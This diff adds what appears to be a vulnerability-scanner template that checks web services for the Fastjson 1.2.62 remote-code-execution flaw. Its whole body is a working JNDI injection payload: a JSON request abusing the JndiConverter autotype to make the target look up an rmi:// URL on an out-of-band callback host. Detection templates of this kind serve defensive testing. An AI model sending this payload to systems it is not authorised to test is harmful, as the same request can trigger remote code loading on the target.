@@ -1,0 +1,18 @@
+name: fastjson-1-2-62-rce
+set:
+  reverse: newReverse()
+  reverseURL: reverse.domain
+rules:
+  r0:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json; charset=utf-8
+      body: |
+        {
+           "@type":"org.apache.xbean.propertyeditor.JndiConverter",
+           "AsText":"rmi://{{reverseURL}}/exploit"
+        }
+    expression: response.status == 200 && reverse.wait(5)
+expression: r0() 
